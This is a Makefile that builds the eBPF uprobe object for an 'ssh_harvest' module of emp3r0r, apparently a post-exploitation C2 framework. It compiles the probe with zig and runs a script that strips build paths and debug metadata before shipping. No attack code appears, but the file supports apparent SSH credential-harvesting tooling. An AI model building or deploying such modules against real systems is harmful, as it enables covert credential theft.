# probe.bpf.o - eBPF uprobe object shipped with the ssh_harvest module.
#
# Built with the zig toolchain that ships with emp3r0r, targeting the
# architecture-independent little-endian BPF bytecode that libbpf loads from
# memory. The object is a build artifact (.o is gitignored); the C2 rebuilds
# it on every invocation through build.sh.
#
# Zig's default caches live under $HOME, which is not guaranteed to be
# writable when the C2 builds modules. Keep them inside the module tree.
#
# -g is required: it is what makes clang emit the .BTF/.BTF.ext sections
# libbpf needs for BTF-defined maps. -fdebug-compilation-dir=. keeps the
# module's build path out of the DWARF/.BTF file records, and sanitize_bpf.py
# then strips the rest of the debug metadata before the object can ship.

ZIG        ?= zig
ZIG_TARGET ?= bpfel-freestanding
BUILD_DIR  ?= .build

OUT := probe.bpf.o
SRC := probe.bpf.c

CFLAGS := -O2 -g -fdebug-compilation-dir=. -target $(ZIG_TARGET) -fno-stack-protector -fno-builtin -fno-asynchronous-unwind-tables -fno-unwind-tables

ZIG_ENV := ZIG_GLOBAL_CACHE_DIR=$(BUILD_DIR)/zig-global ZIG_LOCAL_CACHE_DIR=$(BUILD_DIR)/zig-local

.PHONY: all clean

all: $(OUT)

$(OUT): $(SRC) Makefile sanitize_bpf.py
	@command -v $(ZIG) >/dev/null 2>&1 || { echo "ssh_harvest: zig not found in PATH"; exit 1; }
	@command -v python3 >/dev/null 2>&1 || { echo "ssh_harvest: python3 not found in PATH"; exit 1; }
	@mkdir -p $(BUILD_DIR)
	$(ZIG_ENV) $(ZIG) cc $(CFLAGS) -c $(SRC) -o $@
	python3 sanitize_bpf.py $@

clean:
	rm -rf $(OUT) $(BUILD_DIR)
